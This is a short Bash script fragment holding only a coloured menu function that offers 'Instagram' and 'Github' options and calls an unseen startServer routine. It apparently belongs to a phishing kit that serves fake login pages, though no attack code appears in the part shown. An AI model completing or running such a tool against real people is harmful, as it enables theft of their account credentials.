#!/bin/bash

menu() {
  printf "\n"
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m   \e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Github\e[0m\n"
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m98\e[0m\e[1;92m]\e[0m\e[1;93mCredits  \e[0m\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93mExit\e[0m\n"

  read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option

  if [[ $option == 1 || $option == 01 ]]; then
    server="instagram"
    startServer

  elif [[ $option == 2 || $option == 02 ]]; then
    server="github"
    startServer

  elif [[ $option == 98 ]]; then
    printf "\e[1;93m [!] SullFurix (@sullfurix)\e[0m\n"
    sleep 3
    clear
    banner
    menu

  elif [[ $option == 99 ]]; then
    exit 1

  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    banner
    menu
  fi
}
